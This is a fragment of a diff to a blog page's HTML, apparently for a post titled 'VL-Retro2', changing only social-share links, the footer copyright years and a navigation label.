+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/14/VL-Retro2/&is_video=false&description=VL-Retro2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Retro2&body=Check out this article: http://example.com/2025/03/14/VL-Retro2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/14/VL-Retro2/&title=VL-Retro2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/14/VL-Retro2/&name=VL-Retro2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/14/VL-Retro2/&t=VL-Retro2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -293,7 +294,7 @@
     Copyright &copy;
     
     
-    2016-2025
+    2024-2027
     Panosoiko
   </div>
   <div class="footer-right">
@@ -308,7 +309,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
